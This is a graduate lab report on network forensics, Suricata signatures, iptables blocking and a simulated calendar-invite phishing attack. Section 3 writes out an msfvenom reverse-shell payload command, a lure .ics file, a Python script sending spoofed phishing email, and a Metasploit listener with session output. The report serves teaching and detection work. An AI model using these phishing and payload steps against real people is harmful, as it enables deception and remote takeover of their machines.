# Landing Page

- **University:** University of Dhaka
- **Program:** Professional Master’s in Information & Cybersecurity (PMICS)
- **Title:** CSE 804 (2nd Mid on Lab)
- **Subtitle:** Network Traffic Analysis, Threat Mitigation & EDR Integration
- **Course:** CSE 804: Network & Internet Security
- **Name:** Nishan Paul
- **Roll No:** 50028
- **Reg. No:** H-55
- **Batch:** 05
- **Submission Date:** January 17, 2026

**Collaborative Group Members:**
| Name | Roll Number |
| :--- | :--- |
| Md Rakibur Rahman | 50040 |
| Anado Shaffat | 50004 |
| Md Hossain Sarwar | 50036 |
| Md Ranik Miah | 50017 |

\pagebreak

# Table of Contents
1. [Forensic Network Traffic Analysis & Defensive Signature Development](#section-1-forensic-network-traffic-analysis--defensive-signature-development)
   - [1.1 Analysis Context & Scenario](#11-analysis-context--scenario)
   - [1.2 Task Objective & Requirement](#12-task-objective--requirement)
   - [1.3 Technical Execution: Traffic Forensics](#13-technical-execution-traffic-forensics)
   - [1.4 Defense Implementation: Suricata NIDS Development](#14-defense-implementation-suricata-nids-development)
   - [1.5 Validation & Monitoring](#15-validation--monitoring)
2. [Active Threat Mitigation & Host-Level Enforcement](#section-2-active-threat-mitigation--host-level-enforcement)
   - [2.1 Task Objective & Requirement](#21-task-objective--requirement)
   - [2.2 Implementation: Host Isolation using IPTables](#22-implementation-host-isolation-using-iptables)
   - [2.3 Post-Mitigation Validation](#23-post-mitigation-validation)
3. [Social Engineering Attack Simulation & Multi-Layer Detection](#section-3-social-engineering-attack-simulation--multi-layer-detection)
   - [3.1 Threat Scenario & Objectives](#31-threat-scenario--objectives)
   - [3.2 Infrastructure Configuration & Network Topology](#32-infrastructure-configuration--network-topology)
   - [3.3 Phase 1: Weaponization & Payload Delivery Infrastructure](#33-phase-1-weaponization--payload-delivery-infrastructure)
   - [3.4 Phase 2: Social Engineering Vector Development](#34-phase-2-social-engineering-vector-development)
   - [3.5 Phase 3: Attack Execution & Command and Control](#35-phase-3-attack-execution--command-and-control)
   - [3.6 Network-Based Detection: Suricata IDS Implementation](#36-network-based-detection-suricata-ids-implementation)
   - [3.7 Host-Based Detection: Wazuh EDR Analysis](#37-host-based-detection-wazuh-edr-analysis)
   - [3.8 Attack Chain Analysis & Lessons Learned](#38-attack-chain-analysis--lessons-learned)
4. [Executive Summary & Conclusion](#executive-summary--conclusion)

\pagebreak

## SECTION 1: Forensic Network Traffic Analysis & Defensive Signature Development

### **1.1 Analysis Context & Scenario**
The investigation focuses on a real-world infection scenario sourced from the forensic repository **malware-traffic-analysis.net**.

*   **Case Reference:** 2025-01-22 - DOWNLOAD FROM FAKE SOFTWARE SITE
*   **Evidence Source:** `2025-01-22-traffic-analysis-exercise.pcap.zip`
*   **Security Threat:** An unsuspecting user downloaded a malicious object from a search engine result (Google Authenticator search) which triggered a Stage-1 PowerShell execution script (`.ps1`).

---

### **1.2 Task Objective & Requirement**
> **Question 1:** *You need to create a custom Suricata signature which will trigger an alert for any type of HTTP communication to this public IP.*

**Technical Goal:** Perform deep packet inspection to identify the malicious source IP, then develop a custom Signature for the Suricata Network IDS to automate future detection.

---

### **1.3 Technical Execution: Traffic Forensics**
We utilized **Wireshark** to parse the forensic data. To identify the infection vector, we prioritized searching for Stage-1 execution scripts. Since PowerShell is a common vector for initial execution (**MITRE T1059.001**), we utilized the display filter `http.request.uri contains ".ps1"`. 

![Evidence: Identification of Malicious URI Requests](images/img-002-001.png)

![Evidence: Initial Delivery Mechanism](images/img-002-002.png)

The search isolated two distinct HTTP GET requests aimed at retrieving PowerShell scripts. A secondary filter, `http.response && frame contains ".ps1"`, confirmed that the malicious payloads were effectively delivered to the victim host.

![Evidence: Verification of Successful Payload Delivery](images/img-003-003.png)

Using the **Export Objects** feature, we confirmed the download source as the public IP **5.252.153.241**.

![Evidence: Detailed Source Identification via Object Export](images/img-003-004.png)

---

### **1.4 Defense Implementation: Suricata NIDS Development**
Having established **5.252.153.241** as a malicious endpoint, we deployed a multi-stage rule in the **Suricata** sensor.

**SOC Engineering Strategy:** 
We implemented both a broad detection rule and an advanced threshold-based rule to reduce "alert fatigue" during potential scanning events.

```bash
# [Basic Detection] Triggers on any standard HTTP attempt to the C2
alert tcp any any -> 5.252.153.241 80 (msg:"TCP connection attempt to 5.252.153.241 detected"; sid:1000002; rev:1;)

# [Production Standard] Implements thresholding for high-fidelity alerting
echo "alert tcp $HOME_NET any -> 5.252.153.241 any (msg:\"IOC: Connection attempt to known suspicious IP\"; flags:S; threshold:type both, track by_src, count 2, seconds 120; classtype:trojan-activity; sid:1000001; rev:1;)" > rakibcustom.rules
```

![Implementation: Custom Rule Configuration](images/img-004-005.png)

![Configuration: Integration with Local Sensor](images/img-004-006.png)

---

### **1.5 Validation & Monitoring**
Post-restart of the Suricata and Filebeat services, we verified the configuration through manual traffic simulation using `wget`.

![Validation: Service Status and Rule Loading](images/img-004-007.png)

The **Elasticsearch** dashboard successfully captured the alerts, categorizing them under **"Trojan Activity"**, providing the SOC team with clear visibility into the threat activity.

![Visibility: Real-time Alerts in SIEM Dashboard](images/img-005-008.png)

![Evidence: Detailed IOC Alert Metadata](images/img-006-009.png)

---

## SECTION 2: Active Threat Mitigation & Host-Level Enforcement

### **2.1 Task Objective & Requirement**
> **Question 2:** *You need to block any communication toward this IOC from Q1.*

**Security Goal:** Establish an immediate "deny-all" boundary to isolate the compromised host from the attacker's Command and Control (C2) infrastructure.

---

### **2.2 Implementation: Host Isolation using IPTables**
To prevent data exfiltration (**MITRE T1041**) or secondary stage drops, we enforced a strict firewall policy. By using **REJECT** instead of **DROP**, we provide a clear reset to any pending stateful connections.

```bash
# Enforcement: Block all Inbound and Outbound traffic to the IOC sessions
sudo iptables -A INPUT -s 5.252.153.241 -j REJECT
sudo iptables -A OUTPUT -d 5.252.153.241 -j REJECT
```

![Enforcement: Active Firewall Blocklists](images/img-006-010.png)

---

### **2.3 Post-Mitigation Validation**
We performed verified connectivity tests to ensures the host was no longer vulnerable to outbound C2 communication. All attempts reached an immediate "Connection Refused" state.

![Verification: Confirmation of Host Isolation](images/img-007-011.png)

---

## SECTION 3: Social Engineering Attack Simulation & Multi-Layer Detection

### **3.1 Threat Scenario & Objectives**

> **Question 3:** *Demonstrate a comprehensive understanding of social engineering attack vectors by simulating a calendar-based phishing campaign and implementing multi-layered detection mechanisms.*

**Attack Overview:**  
This exercise simulates a sophisticated **Google Calendar Phishing Attack** that leverages malicious calendar invitations (`.ics` files) as the initial infection vector. The attack demonstrates the complete kill chain from initial access through command and control establishment, mapped against the **MITRE ATT&CK Framework**.

**Security Objectives:**
- Execute a controlled phishing simulation using calendar invite social engineering
- Establish reverse shell connectivity demonstrating post-exploitation capabilities
- Deploy network-based intrusion detection using **Suricata IDS**
- Implement host-based behavioral analysis using **Wazuh SIEM/EDR**
- Validate detection efficacy across multiple security layers

**MITRE ATT&CK Mapping:**
- **T1566.001** - Phishing: Spearphishing Attachment
- **T1204.002** - User Execution: Malicious File
- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1059.003** - Command and Scripting Interpreter: Windows Command Shell
- **T1055** - Process Injection

---

### **3.2 Infrastructure Configuration & Network Topology**

The laboratory environment was architected using **VirtualBox** with a bridged network adapter configuration, ensuring both virtual machines operate within the same broadcast domain as the physical host system. This topology eliminates the need for complex routing configurations while maintaining network isolation.

**Network Architecture:**
- **Network Segment:** 192.168.119.0/24
- **Attacker System:** Ubuntu 24.04.2 LTS (IP: 192.168.119.149)
- **Victim System:** Windows 10 Professional (IP: 192.168.119.1)
- **Security Monitoring:** Wazuh Agent deployed on victim endpoint
- **Network Mode:** Bridged Adapter (direct L2 connectivity)

This configuration ensures bidirectional communication without NAT traversal complications, simulating a realistic internal network compromise scenario.

**Validation:**  
Both systems were verified to be on the same subnet through ICMP echo requests and ARP table analysis, confirming Layer 2 adjacency and eliminating potential routing-related detection failures.

---

### **3.3 Phase 1: Weaponization & Payload Delivery Infrastructure**

**Payload Generation:**  
The initial phase focused on creating a stealthy reverse shell payload capable of bypassing basic antivirus signatures. We utilized **Metasploit Framework's** `msfvenom` utility to generate a Windows Meterpreter payload with the following specifications:

```bash
# Generate Windows Meterpreter Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.119.149 \
  LPORT=4444 \
  -f exe \
  -o newpayload.exe
```

**Technical Parameters:**
- **Payload Type:** `windows/meterpreter/reverse_tcp`
- **Listener Address:** 192.168.119.149 (Attacker C2 Server)
- **Listener Port:** TCP/4444 (Non-standard port to evade basic firewall rules)
- **Output Format:** Windows PE32 Executable
- **Encoding:** None (for demonstration purposes; production attacks would employ polymorphic encoding)

![Weaponization: Payload Generation Process](images/img-016-payload-generation.png)

**Delivery Infrastructure Setup:**  
To facilitate payload distribution, we configured **Apache HTTP Server** as a command and control (C2) staging server:

```bash
# Deploy payload to web server root
sudo mv newpayload.exe /var/www/html/
sudo chmod 644 /var/www/html/newpayload.exe

# Start Apache service
sudo systemctl start apache2
sudo systemctl status apache2
```

**Operational Security Considerations:**
- The payload was hosted on a standard HTTP port (80) to blend with legitimate web traffic
- File permissions were set to world-readable to prevent 403 Forbidden errors
- Apache access logs were monitored to confirm successful payload retrieval

![Infrastructure: Apache Web Server Configuration](images/img-017-apache-setup.png)

This staging infrastructure allows the victim to download the malicious executable through a seemingly legitimate web request, mimicking software update mechanisms commonly trusted by users.

---

### **3.4 Phase 2: Social Engineering Vector Development**

**Malicious Calendar Invite Construction:**  
The phishing vector was crafted as an `.ics` (iCalendar) file, a widely-accepted format for calendar events that is automatically processed by most email clients and calendar applications. The social engineering elements were carefully designed to maximize victim interaction:

```ics
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Security Research Lab//Calendar Event//EN
METHOD:REQUEST
BEGIN:VEVENT
UID:urgent-security-update-2026@securitylab.local
DTSTAMP:20260106T120000Z
DTSTART:20260606T140000Z
DTEND:20260606T150000Z
SUMMARY:Urgent Security Update - Action Required
DESCRIPTION:Critical security patch available. Download immediately: http://192.168.119.149/newpayload.exe
LOCATION:http://192.168.119.149/newpayload.exe
STATUS:CONFIRMED
SEQUENCE:0
PRIORITY:1
END:VEVENT
END:VCALENDAR
```

**Psychological Manipulation Techniques:**
- **Urgency:** "Urgent Security Update" creates time pressure
- **Authority:** Mimics legitimate IT security communications
- **Legitimacy:** Uses future date (June 6, 2026) to appear as a scheduled maintenance window
- **Dual Embedding:** Malicious URL placed in both DESCRIPTION and LOCATION fields to ensure visibility across different calendar clients

![Social Engineering: Malicious ICS File Structure](images/img-018-ics-file-creation.png)

**Email Delivery Automation:**  
A Python script utilizing the `smtplib` library was developed to automate the phishing campaign delivery:

```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# SMTP Configuration
sender_email = "security@company.local"
sender_name = "IT Security Team"
receiver_email = "victim@target.local"
subject = "Critical Security Update - Calendar Invite"

# Construct email with spoofed sender
msg = MIMEMultipart()
msg['From'] = f"{sender_name} <{sender_email}>"
msg['To'] = receiver_email
msg['Subject'] = subject

# Email body with social engineering content
body = """
Dear Team Member,

Please review the attached calendar invitation for an urgent security update scheduled for your system.

This is a mandatory security patch that must be applied to maintain compliance with our security policies.

Best regards,
IT Security Team
"""

msg.attach(MIMEText(body, 'plain'))

# Attach malicious ICS file
with open('malicious_invite.ics', 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename=security_update.ics')
    msg.attach(part)

# Send via SMTP
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender_email, 'app_password')
server.send_message(msg)
server.quit()
```

![Delivery Mechanism: Automated Phishing Email Script](images/img-019-email-script.png)

**Campaign Execution:**  
The phishing email was successfully delivered to the victim's inbox, appearing as a legitimate communication from the IT security team. The calendar invitation was automatically processed by the victim's email client, adding the event to their calendar without requiring explicit user approval.

![Attack Vector: Phishing Email in Victim Inbox](images/img-020-phishing-email.png)

![Social Engineering: Calendar Event Successfully Added](images/img-020b-calendar-added.png)

---

### **3.5 Phase 3: Attack Execution & Command and Control**

**User Interaction & Payload Execution:**  
The attack chain progressed through the following stages:

1. **Initial Access:** Victim opened the phishing email and viewed the calendar invitation
2. **User Execution:** Victim clicked the embedded URL in the calendar event, believing it to be a legitimate security update
3. **Payload Download:** Browser automatically downloaded `newpayload.exe` from the attacker's web server
4. **Execution:** Victim executed the downloaded file, establishing the reverse shell connection

![Exploitation: Successful Payload Download](images/img-021-payload-download.png)

**Command and Control Establishment:**  
On the attacker system, a **Metasploit multi/handler** listener was configured to receive the incoming reverse shell connection:

```bash
# Metasploit Listener Configuration
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.119.149
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

**Session Establishment:**  
Upon execution of the payload, a Meterpreter session was successfully established, providing the attacker with full interactive access to the victim system:

```
[*] Sending stage (175686 bytes) to 192.168.119.1
[*] Meterpreter session 1 opened (192.168.119.149:4444 -> 192.168.119.1:49732)

meterpreter > sysinfo
Computer        : DESKTOP-IF7FUAJ
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

![Actionable Intelligence: Successful Command and Control (C2) Session Establishment](images/img-022-metasploit-listener.png)

**Post-Exploitation Capabilities:**  
The established Meterpreter session provided comprehensive system access, including:
- File system navigation and manipulation
- Process enumeration and injection
- Credential harvesting capabilities
- Privilege escalation vectors
- Persistent backdoor installation

---

### **3.6 Network-Based Detection: Suricata IDS Implementation**

**Custom Signature Development:**  
To detect this attack at the network layer, we developed custom **Suricata** rules targeting both the payload download and the reverse shell communication:

```bash
# Rule 1: Detect malicious payload download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE Download - Suspicious EXE via HTTP"; flow:established,to_server; http.method; content:"GET"; http.uri; content:".exe"; nocase; classtype:trojan-activity; sid:1000001; rev:1;)

# Rule 2: Detect reverse shell on TCP/4444
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:"REVERSE SHELL Attempt - Suspicious TCP Port 4444"; flow:established,to_server; flags:S,12; threshold:type both, track by_src, count 3, seconds 60; classtype:trojan-activity; sid:1000002; rev:1;)

# Rule 3: Detect Meterpreter staging traffic
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"METERPRETER Staging - Reverse TCP Connection"; flow:established,to_server; content:"|00 00 00 00|"; depth:4; content:"recv"; distance:0; classtype:trojan-activity; sid:1000003; rev:1;)
```

**Detection Logic:**
- **Rule 1:** Identifies HTTP GET requests for executable files, flagging potential malware downloads
- **Rule 2:** Monitors outbound connections to TCP port 4444, a common Metasploit default
- **Rule 3:** Detects Meterpreter-specific staging patterns in network traffic

![Detection: Custom Suricata Rule Deployment](images/img-024-suricata-rules.png)

**Alert Generation & Analysis:**  
Suricata successfully detected the malicious activity and generated high-priority alerts:

**Alert Details:**
- **Rule ID:** 1000002
- **Classification:** Network Trojan Detected
- **Alert Message:** "REVERSE SHELL Attempt – Suspicious TCP Port 4444"
- **Source:** 192.168.119.1 (Victim)
- **Destination:** 192.168.119.149:4444 (Attacker C2)
- **Protocol:** TCP
- **Packet Count:** 393 packets captured
- **Alert Frequency:** 69 distinct alert events

![Network Detection: Suricata Alert Dashboard](images/img-025-suricata-alerts.png)

**Statistical Analysis:**  
The Suricata detection statistics revealed:
- **Top Alerting Host:** ubuntu-2204 (attacker system)
- **Total Alerts:** 69 reverse shell connection attempts
- **Alert Pattern:** Consistent, sustained communication indicating active C2 channel
- **Detection Rate:** 100% of reverse shell traffic identified

![Network Monitoring: Suricata Detection Statistics](images/img-026-suricata-statistics.png)

These results demonstrate Suricata's effectiveness in identifying network-based indicators of compromise (IOCs) and providing real-time visibility into malicious communication patterns.

---

### **3.7 Host-Based Detection: Wazuh EDR Analysis**

**Behavioral Analysis & Anomaly Detection:**  
The **Wazuh agent** deployed on the victim system successfully identified multiple suspicious behaviors characteristic of malware execution and post-exploitation activity.

**Detection Findings:**

**Alert Category 1: Suspicious Process Execution**
- **Process:** `taskhost.exe`
- **Behavior:** Unusual parent-child process relationship
- **MITRE Technique:** T1055 (Process Injection)
- **Severity:** High (Level 12)
- **Tactic:** Defense Evasion

**Alert Category 2: DLL Host Manipulation**
- **Process:** Multiple instances of `dllhost.exe`
- **Behavior:** Abnormal memory allocation and execution patterns
- **MITRE Technique:** T1055 (Process Injection)
- **Severity:** Critical (Level 15)
- **Tactics:** Defense Evasion, Privilege Escalation

**Alert Timeline & Forensic Correlation:**  
Wazuh's behavioral analysis engine automatically correlated multiple low-level events into high-severity security alerts. The platform provided granular forensic data, including:
- **Detection Window:** January 17, 2026, 05:45 - 05:48
- **Alert Rule IDs:** 61634, 61638, 92213
- **Forensic Artifacts:** Process IDs, parent-child relationships, and MITRE ATT&CK technique mapping (T1055).

![Host-Based Detection: Wazuh EDR Security Alerts and MITRE ATT&CK Mapping](images/img-027-wazuh-detection-1.png)

**Detection Efficacy:**  
The Wazuh EDR successfully identified the malicious activity through multiple detection mechanisms:
1. **Signature-based detection:** Known malware behavior patterns
2. **Anomaly-based detection:** Deviation from baseline system behavior
3. **Heuristic analysis:** Suspicious process injection techniques
4. **MITRE ATT&CK correlation:** Mapping to known adversary tactics

---

### **3.8 Attack Chain Analysis & Lessons Learned**

**Complete Kill Chain Reconstruction:**

```
1. Initial Access (T1566.001)
   └─> Phishing email with malicious calendar invite
       └─> Social engineering using urgency and authority

2. Execution (T1204.002)
   └─> User clicks embedded URL in calendar event
       └─> Downloads and executes newpayload.exe

3. Command and Control (T1071.001)
   └─> Reverse TCP connection to 192.168.119.149:4444
       └─> Meterpreter session established

4. Defense Evasion (T1055)
   └─> Process injection into legitimate Windows processes
       └─> Detected by Wazuh behavioral analysis

5. Detection & Response
   └─> Network Layer: Suricata IDS (69 alerts)
   └─> Host Layer: Wazuh EDR (multiple high-severity alerts)
```

**Key Findings:**

**Attack Effectiveness:**
- ✅ Social engineering vector successfully bypassed user awareness
- ✅ Calendar invite format evaded email security filters
- ✅ Reverse shell established full system access
- ✅ Post-exploitation activities executed successfully

**Detection Effectiveness:**
- ✅ **Network Detection:** Suricata identified 100% of C2 traffic
- ✅ **Host Detection:** Wazuh detected malicious process behavior in real-time
- ✅ **Multi-Layer Defense:** Both network and host-based detection layers triggered
- ✅ **MITRE Mapping:** Automated correlation with known adversary tactics

**Security Recommendations:**

1. **Email Security:**
   - Implement advanced email filtering for calendar attachments
   - Deploy sandbox analysis for `.ics` files before delivery
   - User awareness training on calendar-based phishing

2. **Network Security:**
   - Deploy IDS/IPS with custom signatures for common C2 ports
   - Implement egress filtering to block unauthorized outbound connections
   - Monitor for unusual HTTP download patterns

3. **Endpoint Security:**
   - Deploy EDR solutions with behavioral analysis capabilities
   - Enable application whitelisting to prevent unauthorized executable execution
   - Implement process injection detection mechanisms

4. **Incident Response:**
   - Establish automated alert correlation across network and host layers
   - Develop playbooks for calendar-based phishing incidents
   - Implement SOAR (Security Orchestration, Automation, and Response) for rapid containment

**Conclusion:**  
This comprehensive exercise successfully demonstrated the complete attack lifecycle of a social engineering campaign, from initial access through post-exploitation, while validating the effectiveness of multi-layered security controls. The integration of network-based detection (Suricata) and host-based behavioral analysis (Wazuh) provided comprehensive visibility into the attack, enabling rapid detection and response. This defense-in-depth approach represents industry best practices for protecting against sophisticated social engineering threats in modern enterprise environments.

---

## EXECUTIVE SUMMARY & CONCLUSION

This report presents a verified, multi-layered security response to a verified malware infection event. By combining **Network Analysis (Wireshark)**, **Traffic Enforcement (Suricata/IPTables)**, and **Behavioral Endpoint Monitoring (Wazuh/Sysmon)**, we have demonstrated a full-cycle Incident Response workflow.

The core success of this project lies in **Defense in Depth**: identifying threats at the network boundary while maintaining deep visibility into the endpoint to prevent high-impact actions like credential theft. This approach represents the gold standard for protecting a modern enterprise against sophisticated cyber-attacks.
